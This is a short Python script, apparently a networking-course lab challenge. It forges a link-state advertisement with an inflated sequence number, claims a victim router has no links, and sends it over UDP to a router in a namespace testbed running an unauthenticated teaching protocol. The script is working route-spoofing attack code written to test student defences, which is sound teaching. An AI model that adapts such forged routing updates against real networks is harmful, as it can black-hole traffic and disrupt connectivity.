#!/usr/bin/env python3
"""
挑战任务 T11：向某台路由器发一条伪造的 LSA。

    sudo ip netns exec r3 python3 2026/experiments/02/forge_lsa.py --to 10.0.13.1 --victim 2 --seq 1000000

含义：站在 r3 的位置，告诉 r1“router 2 的最新 LSA（seq 一百万）说它一条链路、一个网段都没有”。
LSR-lite 没有认证，r1 只看 seq，于是照单全收并继续泛洪……接下来发生什么，取决于你有没有实现 R6。

参数：
  --to        受害路由器在这条链路上的地址（报文从本 namespace 的接口发出）
  --victim    被冒名的 router id
  --seq       伪造的 seq（要比网络里现有的大）
  --from-rid  报文外层的 rid，默认 = 本机在实验床里的 id（只影响日志，不影响处理）
"""

from __future__ import annotations

import argparse
import json
import socket
import sys

PORT = 5200


def main(argv) -> int:
  p = argparse.ArgumentParser(description="发送一条伪造的 LSA")
  p.add_argument("--to", required=True)
  p.add_argument("--victim", type=int, required=True)
  p.add_argument("--seq", type=int, default=1_000_000)
  p.add_argument("--from-rid", type=int, default=99)
  p.add_argument("--port", type=int, default=PORT)
  args = p.parse_args(argv)

  msg = {"v": 1, "type": "lsu", "rid": args.from_rid,
         "lsas": [{"rid": args.victim, "seq": args.seq, "links": [], "prefixes": []}]}
  data = json.dumps(msg, separators=(",", ":"), sort_keys=True).encode()
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.sendto(data, (args.to, args.port))
  print(f"sent to {args.to}:{args.port}: {data.decode()}")
  return 0


if __name__ == "__main__":
  sys.exit(main(sys.argv[1:]))
